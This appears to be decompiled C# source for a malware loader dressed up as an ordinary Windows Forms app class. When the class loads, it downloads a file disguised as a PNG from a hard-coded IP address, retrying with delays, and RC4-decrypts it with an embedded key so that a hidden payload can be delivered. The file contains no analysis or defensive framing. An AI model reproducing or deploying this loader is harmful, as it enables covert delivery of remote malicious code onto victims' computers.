using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Text;
using System.Threading;

namespace WindowsFormsApp31;

internal class Short
{
	private static readonly List<byte[]> List = new List<byte[]> { Wwovqi("http://185.216.71.120/Yfiwwjn.png") };

	private static readonly byte[] Buffers = List[0];

	internal static byte[] Buffo()
	{
		string s = "Wcnmzbonpzuci";
		byte[] buffers = Buffers;
		byte[] bytes = Encoding.UTF8.GetBytes(s);
		int[] array = new int[256];
		int[] array2 = new int[256];
		byte[] array3 = new byte[buffers.Length];
		int i;
		for (i = 0; i < 256; i++)
		{
			array[i] = bytes[i % bytes.Length];
			array2[i] = i;
		}
		int num = (i = 0);
		for (; i < 256; i++)
		{
			num = (num + array2[i] + array[i]) % 256;
			int num2 = array2[i];
			array2[i] = array2[num];
			array2[num] = num2;
		}
		int num3 = (num = (i = 0));
		for (; i < buffers.Length; i++)
		{
			num3++;
			num3 %= 256;
			num += array2[num3];
			num %= 256;
			int num2 = array2[num3];
			array2[num3] = array2[num];
			array2[num] = num2;
			int num4 = array2[(array2[num3] + array2[num]) % 256];
			array3[i] = (byte)(buffers[i] ^ num4);
		}
		return array3;
	}

	private static byte[] Wwovqi(string site)
	{
		for (int i = 0; i < 10; i++)
		{
			try
			{
				WebResponse response = WebRequest.Create(site).GetResponse();
				Stream stream = Stream(response);
				MemoryStream memoryStream = new MemoryStream();
				stream.CopyTo(memoryStream);
				if (memoryStream.Length > 0)
				{
					byte[] result = memoryStream.ToArray();
					memoryStream.Close();
					return result;
				}
			}
			catch
			{
				Thread.Sleep(TimeSpan.FromSeconds(30.0));
			}
		}
		return null;
	}

	private static Stream Stream(WebResponse webResponse)
	{
		return webResponse.GetResponseStream();
	}
}
